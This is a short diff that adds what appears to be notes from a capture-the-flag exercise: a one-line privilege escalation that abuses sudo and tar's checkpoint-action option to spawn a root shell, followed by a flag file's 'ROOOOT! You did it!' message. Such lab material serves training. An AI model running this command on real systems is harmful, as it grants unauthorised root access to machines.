@@ -1,0 +1,15 @@
+sudo -u root /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+flag.txt
+# cat flag.txt	
+#
+#
+#
+# ROOOOT!
+# You did it! Congratz!
+# 
+# Hope you enjoyed! 
+# 
+# 
+#
+#
